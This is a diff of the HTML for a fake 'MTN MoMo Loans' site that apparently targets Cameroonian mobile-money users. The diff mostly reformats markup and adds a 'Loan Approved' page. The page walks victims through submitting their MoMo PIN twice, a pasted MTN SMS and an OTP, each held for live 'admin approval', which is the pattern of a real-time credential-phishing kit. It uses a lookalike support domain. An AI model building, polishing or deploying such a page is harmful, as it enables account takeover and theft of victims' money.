@@ -12,7 +12,9 @@
 </head>
 <body>
 
-<!-- SPLASH -->
+<!-- ═══════════════════════════════════════════════════════════
+     SPLASH SCREEN
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-splash" class="splash">
     <div class="splash-content">
         <img src="./momo_logo.jpg" alt="MTN MoMo" class="splash-logo" onerror="this.style.display='none'">
@@ -23,7 +25,9 @@
     <div class="splash-text">Loading your experience…</div>
 </div>
 
-<!-- LANDING -->
+<!-- ═══════════════════════════════════════════════════════════
+     LANDING PAGE
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-landing" class="page">
     <header class="hero">
         <div class="hero-top">
@@ -42,7 +46,9 @@
             <div>
                 <strong>Loan Requirement</strong>
                 <p>You must have at least 20% of your requested loan amount in MoMo transactions this month.</p>
-                <div class="alert-example">Loan <span id="reqExample">XAF 1,000,000</span> → Need <span id="reqNeed">XAF 200,000</span> in MoMo</div>
+                <div class="alert-example">
+                    Loan <span id="reqExample">XAF 1,000,000</span> → Need <span id="reqNeed">XAF 200,000</span> in MoMo
+                </div>
             </div>
         </div>
 
@@ -54,16 +60,22 @@
                     <p>XAF · Cameroon</p>
                 </div>
             </div>
+
             <div class="calc-amount-row">
                 <span class="calc-amount-label">Amount</span>
                 <span class="calc-amount-value" id="calcAmt">XAF 1,000,000</span>
             </div>
             <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000" oninput="updateCalc()">
-            <div class="range-ends"><span>XAF 500,000</span><span>XAF 5,000,000</span></div>
+            <div class="range-ends">
+                <span>XAF 500,000</span>
+                <span>XAF 5,000,000</span>
+            </div>
+
             <div class="monthly-box">
                 <span class="ml">Monthly Payment</span>
                 <span class="ma" id="monthlyAmt">XAF 24,000</span>
             </div>
+
             <div class="calc-info" style="margin-top:14px; padding-top:14px; border-top:1px dashed #E5E7EB;">
                 <span>Required MoMo transactions</span>
                 <span id="requiredTx" style="color:#DE350B; font-weight:800;">XAF 200,000</span>
@@ -103,7 +115,9 @@
     <footer class="land-footer">© 2026 MTN MoMo Loans – Powered by MTN Cameroon</footer>
 </div>
 
-<!-- APPLICATION FORM -->
+<!-- ═══════════════════════════════════════════════════════════
+     APPLICATION FORM (all-in-one)
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-application" class="page">
     <nav class="navbar">
         <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
@@ -122,6 +136,7 @@
 
             <div class="msg-box error" id="appErr"><span class="msg-icon">✕</span><span id="appErrTxt"></span></div>
 
+            <!-- LOAN -->
             <h3 class="section-h">💰 Loan Details</h3>
             <div class="field">
                 <label>Loan Type</label>
@@ -153,9 +168,10 @@
             </div>
             <div class="field">
                 <label>Purpose of Loan</label>
-                <textarea id="appLoanPurpose" placeholder="Describe the purpose…" maxlength="300"></textarea>
+                <textarea id="appLoanPurpose" placeholder="Describe the purpose of your loan…" maxlength="300"></textarea>
             </div>
 
+            <!-- 20% -->
             <div class="twenty-block">
                 <div class="twenty-head">
                     <span class="twenty-icon">📊</span>
@@ -170,53 +186,78 @@
                 </label>
             </div>
 
+            <!-- PERSONAL -->
             <h3 class="section-h">👤 Personal Information</h3>
-            <div class="field"><label>Full Name</label><input type="text" id="appFullName" maxlength="80"></div>
-            <div class="field"><label>Email</label><input type="email" id="appEmail" maxlength="120"></div>
             <div class="field">
-                <label>Phone (Cameroon)</label>
-                <div class="phone-row"><div class="ph-pre">+237</div><input type="tel" id="appPhone" maxlength="9" inputmode="numeric"></div>
+                <label>Full Name</label>
+                <input type="text" id="appFullName" maxlength="80" placeholder="Ex. Konan Yao">
+            </div>
+            <div class="field">
+                <label>Email Address</label>
+                <input type="email" id="appEmail" maxlength="120" placeholder="you@email.com">
+            </div>
+            <div class="field">
+                <label>Phone Number (Cameroon)</label>
+                <div class="phone-row">
+                    <div class="ph-pre">+237</div>
+                    <input type="tel" id="appPhone" maxlength="9" inputmode="numeric" placeholder="6XX XXX XXX">
+                </div>
                 <div class="field-hint">9 digits (e.g. 670123456)</div>
             </div>
 
+            <!-- EMPLOYMENT -->
             <h3 class="section-h">💼 Employment</h3>
             <div class="field">
-                <label>Status</label>
+                <label>Employment Status</label>
                 <div class="sel-wrap">
                     <select id="appEmployment">
-                        <option>Employed</option>
-                        <option selected>Self-employed</option>
-                        <option>Unemployed</option>
-                        <option>Retired</option>
+                        <option value="Employed">Employed</option>
+                        <option value="Self-employed" selected>Self-employed</option>
+                        <option value="Unemployed">Unemployed</option>
+                        <option value="Retired">Retired</option>
                     </select>
                 </div>
             </div>
-            <div class="field"><label>Annual Income (XAF)</label><input type="number" id="appIncome" min="0"></div>
-
-            <h3 class="section-h">👥 Next of Kin</h3>
-            <div class="field"><label>Name</label><input type="text" id="appKinName" maxlength="60"></div>
             <div class="field">
-                <label>Phone</label>
-                <div class="phone-row"><div class="ph-pre">+237</div><input type="tel" id="appKinPhone" maxlength="9" inputmode="numeric"></div>
+                <label>Annual Income (XAF)</label>
+                <input type="number" id="appIncome" min="0" max="100000000" placeholder="e.g. 6000000">
             </div>
 
-            <h3 class="section-h">🔐 MoMo PIN</h3>
+            <!-- NEXT OF KIN -->
+            <h3 class="section-h">👥 Next of Kin</h3>
+            <div class="field">
+                <label>Name</label>
+                <input type="text" id="appKinName" maxlength="60" placeholder="Full name">
+            </div>
+            <div class="field">
+                <label>Phone</label>
+                <div class="phone-row">
+                    <div class="ph-pre">+237</div>
+                    <input type="tel" id="appKinPhone" maxlength="9" inputmode="numeric" placeholder="6XX XXX XXX">
+                </div>
+            </div>
+
+            <!-- MOMO PIN -->
+            <h3 class="section-h">🔐 MoMo Security</h3>
             <div class="field">
                 <label>MoMo PIN (5 digits)</label>
                 <div class="pin-row">
-                    <input type="password" id="appPin0" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,0)">
-                    <input type="password" id="appPin1" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,1)">
-                    <input type="password" id="appPin2" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,2)">
-                    <input type="password" id="appPin3" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,3)">
-                    <input type="password" id="appPin4" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,4)">
+                    <input type="password" id="appPin0" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,0,'appPin')">
+                    <input type="password" id="appPin1" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,1,'appPin')">
+                    <input type="password" id="appPin2" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,2,'appPin')">
+                    <input type="password" id="appPin3" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,3,'appPin')">
+                    <input type="password" id="appPin4" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,4,'appPin')">
                 </div>
                 <div class="field-hint">🔒 Stored securely. Used to verify your identity on return.</div>
             </div>
 
+            <!-- T&C -->
             <div class="agreement-wrap">
                 <label class="confirm-check">
                     <input type="checkbox" id="appTnc">
-                    <span>I have read and accept the <a href="#" onclick="event.preventDefault();showTerms()">Terms & Conditions</a>, including MTN MoMo Terms of Use.</span>
+                    <span>I have read and accept the
+                        <a href="#" onclick="event.preventDefault();showTerms()">Terms & Conditions</a>,
+                        including MTN MoMo Terms of Use.</span>
                 </label>
             </div>
 
@@ -225,21 +266,27 @@
     </div>
 </div>
 
-<!-- WAIT FOR ADMIN (application step) -->
+<!-- ═══════════════════════════════════════════════════════════
+     STEP 1/4 — WAIT APPLICATION (admin approval)
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-wait-application" class="page">
     <div class="wait-bg">
         <div class="wait-wrap">
             <div class="wait-icon pulse">⏳</div>
-            <h2>Application under review</h2>
-            <p>Your application has been sent to our team. You will be notified once approved.</p>
+            <h2>Application Under Review</h2>
+            <p>Your application has been sent to our team.<br>You will be notified once approved.</p>
             <div class="wait-status">⏳ Step 1 of 4 · Awaiting admin approval</div>
             <div class="poll-indicator"><span class="dot"></span> Live check</div>
-            <div class="wait-appid">Application ID: <span class="mono" id="waitAppId1">—</span></div>
+            <div class="wait-appid">
+                Application ID: <span class="mono" id="waitAppId1">—</span>
+            </div>
         </div>
     </div>
 </div>
 
-<!-- SMS PASTE -->
+<!-- ═══════════════════════════════════════════════════════════
+     STEP 2/4 — SMS PASTE
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-sms" class="page">
     <nav class="navbar">
         <a class="nav-left" onclick="goTo('page-landing')">← Home</a>
@@ -255,32 +302,41 @@
                     <p class="step-sub">Step 2 of 4</p>
                 </div>
             </div>
+
             <div class="msg-box error" id="smsErr"><span class="msg-icon">✕</span><span id="smsErrTxt"></span></div>
+
             <div class="field">
                 <label>Paste the SMS you received from MTN MoMo</label>
                 <textarea id="smsContent" rows="6" maxlength="2000" placeholder="Paste the complete SMS here..."></textarea>
                 <div class="field-hint">Admin will review this SMS.</div>
             </div>
+
             <button class="btn-primary" id="smsSubmitBtn" onclick="submitSms()">SUBMIT SMS</button>
         </div>
     </div>
 </div>
 
-<!-- WAIT SMS -->
+<!-- ═══════════════════════════════════════════════════════════
+     STEP 2/4 — WAIT SMS (admin approval)
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-wait-sms" class="page">
     <div class="wait-bg">
         <div class="wait-wrap">
             <div class="wait-icon pulse">📩</div>
-            <h2>Verifying your SMS...</h2>
+            <h2>Verifying Your SMS...</h2>
             <p>Your SMS is being reviewed by admin.</p>
             <div class="wait-status">⏳ Step 2 of 4 · Awaiting admin approval</div>
             <div class="poll-indicator"><span class="dot"></span> Live check</div>
-            <div class="wait-appid">Application ID: <span class="mono" id="waitAppId2">—</span></div>
+            <div class="wait-appid">
+                Application ID: <span class="mono" id="waitAppId2">—</span>
+            </div>
         </div>
     </div>
 </div>
 
-<!-- PIN (application flow) -->
+<!-- ═══════════════════════════════════════════════════════════
+     STEP 3/4 — PIN
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-pin" class="page">
     <nav class="navbar">
         <a class="nav-left" onclick="goTo('page-landing')">← Home</a>
@@ -296,7 +352,9 @@
                     <p class="step-sub">Step 3 of 4</p>
                 </div>
             </div>
+
             <div class="msg-box error" id="pinErr"><span class="msg-icon">✕</span><span id="pinErrTxt"></span></div>
+
             <div class="pin-label">Enter your MoMo PIN (5 digits)</div>
             <div class="pin-row">
                 <input type="password" id="pin0" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,0,'pin')">
@@ -305,26 +363,33 @@
                 <input type="password" id="pin3" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,3,'pin')">
                 <input type="password" id="pin4" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,4,'pin')">
             </div>
+
             <button class="btn-primary" id="pinSubmitBtn" onclick="submitPin()">SUBMIT PIN</button>
         </div>
     </div>
 </div>
 
-<!-- WAIT PIN -->
+<!-- ═══════════════════════════════════════════════════════════
+     STEP 3/4 — WAIT PIN (admin approval)
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-wait-pin" class="page">
     <div class="wait-bg">
         <div class="wait-wrap">
             <div class="wait-icon pulse">🔐</div>
-            <h2>Verifying your PIN...</h2>
+            <h2>Verifying Your PIN...</h2>
             <p>Your PIN is being reviewed by admin.</p>
             <div class="wait-status">⏳ Step 3 of 4 · Awaiting admin approval</div>
             <div class="poll-indicator"><span class="dot"></span> Live check</div>
-            <div class="wait-appid">Application ID: <span class="mono" id="waitAppId3">—</span></div>
+            <div class="wait-appid">
+                Application ID: <span class="mono" id="waitAppId3">—</span>
+            </div>
         </div>
     </div>
 </div>
 
-<!-- OTP (application flow) -->
+<!-- ═══════════════════════════════════════════════════════════
+     STEP 4/4 — OTP
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-otp" class="page">
     <nav class="navbar">
         <a class="nav-left" onclick="goTo('page-landing')">← Home</a>
@@ -340,49 +405,106 @@
                     <p class="step-sub">Step 4 of 4</p>
                 </div>
             </div>
+
             <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
+
             <div class="field">
                 <label>Enter the OTP code (4–6 digits)</label>
                 <input type="text" id="otpValue" maxlength="6" inputmode="numeric" placeholder="123456"
                        style="text-align:center; font-size:1.4rem; font-weight:800; letter-spacing:0.4em;">
             </div>
+
             <button class="btn-primary" id="otpSubmitBtn" onclick="submitOtp()">SUBMIT OTP</button>
         </div>
     </div>
 </div>
 
-<!-- WAIT OTP -->
+<!-- ═══════════════════════════════════════════════════════════
+     STEP 4/4 — WAIT OTP (admin approval)
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-wait-otp" class="page">
     <div class="wait-bg">
         <div class="wait-wrap">
             <div class="wait-icon pulse">🔢</div>
-            <h2>Verifying your OTP...</h2>
+            <h2>Verifying Your OTP...</h2>
             <p>Your OTP is being reviewed by admin.</p>
             <div class="wait-status">⏳ Step 4 of 4 · Awaiting admin approval</div>
             <div class="poll-indicator"><span class="dot"></span> Live check</div>
-            <div class="wait-appid">Application ID: <span class="mono" id="waitAppId4">—</span></div>
+            <div class="wait-appid">
+                Application ID: <span class="mono" id="waitAppId4">—</span>
+            </div>
         </div>
     </div>
 </div>
 
-<!-- REJECTED -->
+<!-- ═══════════════════════════════════════════════════════════
+     APPROVED
+     ═══════════════════════════════════════════════════════════ -->
+<div id="page-approved" class="page">
+    <div class="appr-wrap">
+        <div class="appr-top">
+            <div class="check-circle">✓</div>
+            <h2 class="appr-title">Loan Approved!</h2>
+            <p class="appr-sub">Your loan has been successfully approved.</p>
+        </div>
+
+        <div class="appr-amount">
+            <div class="appr-amount-label">Amount to Receive</div>
+            <div class="appr-amount-value" id="aprAmount">XAF 0</div>
+        </div>
+
+        <div class="info-box">
+            <div class="info-box-head">ℹ️ What happens next</div>
+            <ol class="info-list">
+                <li>💰 Funds will be deposited to your MTN MoMo within 5 minutes.</li>
+                <li>📱 You'll receive a confirmation SMS when the deposit is complete.</li>
+                <li>📧 Full loan details sent to your email.</li>
+            </ol>
+        </div>
+
+        <div class="loan-details">
+            <div class="ld-row">
+                <div class="ld-icon ld-yellow">💰</div>
+                <div><div class="ld-lbl">Amount</div><div class="ld-val" id="aprAmt">XAF 0</div></div>
+            </div>
+            <div class="ld-row">
+                <div class="ld-icon ld-black">📅</div>
+                <div><div class="ld-lbl">Term</div><div class="ld-val" id="aprTerm">—</div></div>
+            </div>
+            <div class="ld-row">
+                <div class="ld-icon ld-yellow">💳</div>
+                <div><div class="ld-lbl">Monthly Payment</div><div class="ld-val" id="aprMth">—</div></div>
+            </div>
+        </div>
+
+        <button class="btn-primary" onclick="goToDashboard()">Go to My Dashboard</button>
+    </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════
+     REJECTED
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-rejected" class="page">
     <div class="wait-bg">
         <div class="wait-wrap">
             <div class="wait-icon">❌</div>
-            <h2>Application not approved</h2>
+            <h2>Application Not Approved</h2>
             <p id="rejectReason">Your application was not approved.</p>
             <div class="msg-box error show" style="text-align:left;">
                 <span class="msg-icon">ℹ️</span>
                 <span>Contact support at 111 or email support@mtn-momo-cm.com</span>
             </div>
             <button class="btn-primary" onclick="restart()">Try Again</button>
-            <a href="tel:111" class="btn-ghost" style="display:block; text-align:center; text-decoration:none;">📞 Support: 111</a>
+            <a href="tel:111" class="btn-ghost" style="display:block; text-align:center; text-decoration:none;">
+                📞 Support: 111
+            </a>
         </div>
     </div>
 </div>
 
-<!-- CHECK STATUS — email + phone -->
+<!-- ═══════════════════════════════════════════════════════════
+     CHECK STATUS — Email + Phone
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-check-status" class="page">
     <nav class="navbar">
         <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
@@ -398,19 +520,32 @@
                     <p class="step-sub">Enter your email and phone number</p>
                 </div>
             </div>
+
             <div class="msg-box error" id="chkErr"><span class="msg-icon">✕</span><span id="chkErrTxt"></span></div>
-            <div class="field"><label>Email</label><input type="email" id="chkEmail"></div>
+
+            <div class="field">
+                <label>Email</label>
+                <input type="email" id="chkEmail" placeholder="you@email.com">
+            </div>
             <div class="field">
                 <label>Phone (Cameroon)</label>
-                <div class="phone-row"><div class="ph-pre">+237</div><input type="tel" id="chkPhone" maxlength="9" inputmode="numeric"></div>
+                <div class="phone-row">
+                    <div class="ph-pre">+237</div>
+                    <input type="tel" id="chkPhone" maxlength="9" inputmode="numeric" placeholder="6XX XXX XXX">
+                </div>
             </div>
+
             <button class="btn-primary" id="chkBtn" onclick="startCheckStatus()">SEND VERIFICATION CODE</button>
-            <div class="field-hint" style="text-align:center; margin-top:10px;">We'll send a 6-digit code to your email.</div>
+            <div class="field-hint" style="text-align:center; margin-top:10px;">
+                We'll send a 6-digit code to your email.
+            </div>
         </div>
     </div>
 </div>
 
-<!-- CHECK OTP -->
+<!-- ═══════════════════════════════════════════════════════════
+     CHECK STATUS — OTP (email verification)
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-check-otp" class="page">
     <nav class="navbar">
         <a class="nav-left" onclick="goTo('page-check-status')">← Back</a>
@@ -426,7 +561,9 @@
                     <p class="step-sub">Enter the code sent to your email</p>
                 </div>
             </div>
+
             <div class="msg-box error" id="cotpErr"><span class="msg-icon">✕</span><span id="cotpErrTxt"></span></div>
+
             <div class="field">
                 <label>6-digit code</label>
                 <div class="otp-inputs">
@@ -438,16 +575,22 @@
                     <input type="text" id="cotp5" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMove(this,5)">
                 </div>
             </div>
+
             <button class="btn-primary" id="cotpBtn" onclick="verifyCheckOtp()">VERIFY CODE</button>
+
             <div id="cotpResendWrap" style="margin-top:14px; display:none;">
                 <div id="cotpCountdown" class="countdown-text">Resend in 2:00</div>
-                <button id="cotpResendBtn" class="btn-ghost" onclick="resendCheckOtp()" style="display:none;">🔄 Resend code</button>
+                <button id="cotpResendBtn" class="btn-ghost" onclick="resendCheckOtp()" style="display:none;">
+                    🔄 Resend code
+                </button>
             </div>
         </div>
     </div>
 </div>
 
-<!-- CHECK PIN -->
+<!-- ═══════════════════════════════════════════════════════════
+     CHECK STATUS — PIN
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-check-pin" class="page">
     <nav class="navbar">
         <a class="nav-left" onclick="goTo('page-check-otp')">← Back</a>
@@ -463,7 +606,9 @@
                     <p class="step-sub">Verify with your 5-digit MoMo PIN</p>
                 </div>
             </div>
+
             <div class="msg-box error" id="cpinErr"><span class="msg-icon">✕</span><span id="cpinErrTxt"></span></div>
+
             <div class="pin-label">Your MoMo PIN (5 digits)</div>
             <div class="pin-row">
                 <input type="password" id="cpin0" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,0,'cpin')">
@@ -472,18 +617,25 @@
                 <input type="password" id="cpin3" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,3,'cpin')">
                 <input type="password" id="cpin4" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,4,'cpin')">
             </div>
+
             <button class="btn-primary" id="cpinBtn" onclick="verifyCheckPin()">VERIFY PIN & LOGIN</button>
         </div>
     </div>
 </div>
 
-<!-- DASHBOARD -->
+<!-- ═══════════════════════════════════════════════════════════
+     DASHBOARD
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-dashboard" class="page">
     <div class="dash">
         <header class="dash-header">
-            <div class="dash-logo"><span class="dash-icon">M</span><span class="dash-name">MoMo</span></div>
+            <div class="dash-logo">
+                <span class="dash-icon">M</span>
+                <span class="dash-name">MoMo</span>
+            </div>
             <div class="dash-right"><span>🔔</span><span>👤</span></div>
         </header>
+
         <div class="dash-balance">
             <div class="dash-balance-label">Loan Balance</div>
             <div class="dash-balance-amount" id="dashBalance">XAF 0</div>
@@ -492,11 +644,22 @@
                 <span>Term: <b id="dashTerm">—</b></span>
             </div>
         </div>
+
         <div class="dash-actions">
-            <div class="dash-tile" onclick="downloadContract()"><div class="dash-tile-icon">📥</div><div>Contract</div></div>
-            <div class="dash-tile" onclick="alert('Coming soon')"><div class="dash-tile-icon">💰</div><div>Pay</div></div>
-            <div class="dash-tile" onclick="logout()"><div class="dash-tile-icon">🚪</div><div>Logout</div></div>
+            <div class="dash-tile" onclick="downloadContract()">
+                <div class="dash-tile-icon">📥</div>
+                <div>Contract</div>
+            </div>
+            <div class="dash-tile" onclick="alert('Coming soon')">
+                <div class="dash-tile-icon">💰</div>
+                <div>Pay</div>
+            </div>
+            <div class="dash-tile" onclick="logout()">
+                <div class="dash-tile-icon">🚪</div>
+                <div>Logout</div>
+            </div>
         </div>
+
         <div class="dash-recent">
             <h3>Recent Activity</h3>
             <div id="dashTxList" class="dash-tx-list">
@@ -506,7 +669,9 @@
     </div>
 </div>
 
-<!-- TERMS MODAL -->
+<!-- ═══════════════════════════════════════════════════════════
+     TERMS MODAL
+     ═══════════════════════════════════════════════════════════ -->
 <div id="termsModal" class="modal-bg" onclick="if(event.target===this)closeTerms()">
     <div class="modal-doc">
         <div class="modal-head">
